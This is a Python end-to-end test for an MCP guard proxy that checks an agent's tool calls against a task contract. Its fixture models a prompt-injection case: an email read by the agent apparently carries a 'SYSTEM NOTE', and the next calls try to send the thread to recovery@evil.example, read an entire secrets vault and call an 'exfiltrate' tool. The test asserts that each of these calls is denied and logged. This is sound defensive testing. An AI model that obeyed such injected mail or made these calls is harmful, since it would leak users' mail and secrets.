"""leash-mcp end to end: a real subprocess proxy in front of the fake MCP server, spoken to over stdio."""
import json
import shlex
import subprocess
import sys
from pathlib import Path

from backend.guard.audit import AuditLog

ROOT = Path(__file__).resolve().parents[2]


def _session(task: str, requests: list[dict], audit: Path) -> list[dict]:
    proc = subprocess.run(
        [sys.executable, "-m", "backend.mcp.proxy", "--task", task, "--audit", str(audit),
         "--upstream", f"{shlex.quote(sys.executable)} -m backend.mcp.fake_server"],
        input="".join(json.dumps(r) + "\n" for r in requests), capture_output=True, text=True, cwd=ROOT, timeout=30,
    )
    assert proc.returncode == 0, proc.stderr
    return {m["id"]: m for m in map(json.loads, proc.stdout.splitlines()) if "id" in m}


def _call(i, name, **args):
    return {"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": name, "arguments": args}}


def test_proxy_guards_tools_call(tmp_path):
    audit = tmp_path / "audit.jsonl"
    out = _session("Reply to Priya confirming the meeting time she proposed.", [
        {"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {}},
        {"jsonrpc": "2.0", "method": "notifications/initialized"},
        {"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
        _call(3, "read_email", id=5),                                                        # untrusted: taints
        _call(4, "send_email", to="recovery@evil.example", subject="fwd", body="thread"),    # injected recipient
        _call(5, "send_email", to="priya@nimbus.test", subject="Re", body="Monday 3 pm works"),
        _call(6, "read_vault", key="ALL"),                                                   # not in contract
        _call(7, "exfiltrate", data="x"),                                                    # unknown tool
    ], audit)
    assert out[1]["result"]["serverInfo"]["name"] == "fake-mail"          # passthrough
    assert len(out[2]["result"]["tools"]) == 2
    assert "SYSTEM NOTE" in out[3]["result"]["content"][0]["text"]        # read allowed, forwarded
    deny = out[4]["result"]
    assert deny["isError"] and deny["_meta"]["leash"]["rule_id"] == "RECIPIENT_NOT_IN_CONTRACT"
    assert "came from an email you received" in deny["content"][0]["text"]
    assert out[5]["result"]["content"][0]["text"] == "Email sent to priya@nimbus.test."
    assert out[6]["result"]["_meta"]["leash"]["rule_id"] == "TOOL_NOT_IN_CONTRACT"
    assert out[7]["result"]["_meta"]["leash"]["rule_id"] == "FAILSAFE"

    log = AuditLog(audit)
    entries = log.read()
    assert [e["tool"] for e in entries] == ["read_email", "send_email", "send_email", "read_vault", "exfiltrate"]
    assert [e["verdict"] for e in entries] == ["ALLOW", "DENY", "ALLOW", "DENY", "DENY"]
    assert all(e["session_id"].startswith("mcp-") for e in entries) and log.verify()["ok"]
